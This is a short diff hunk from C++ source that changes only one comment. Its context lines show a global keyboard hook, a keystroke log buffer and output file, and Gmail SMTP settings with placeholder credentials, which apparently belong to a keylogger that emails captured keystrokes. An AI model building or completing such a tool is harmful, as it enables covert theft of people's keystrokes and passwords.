@@ -38,7 +38,7 @@ HHOOK keyboardHook;
 std::ofstream outputFile;
 std::string logBuffer;
 
-// Email Configuration
+// Email Configurations
 const char* SMTP_SERVER = "smtp.gmail.com";
 const char* SMTP_USERNAME = "your_email@gmail.com";
 const char* SMTP_PASSWORD = "your_password";
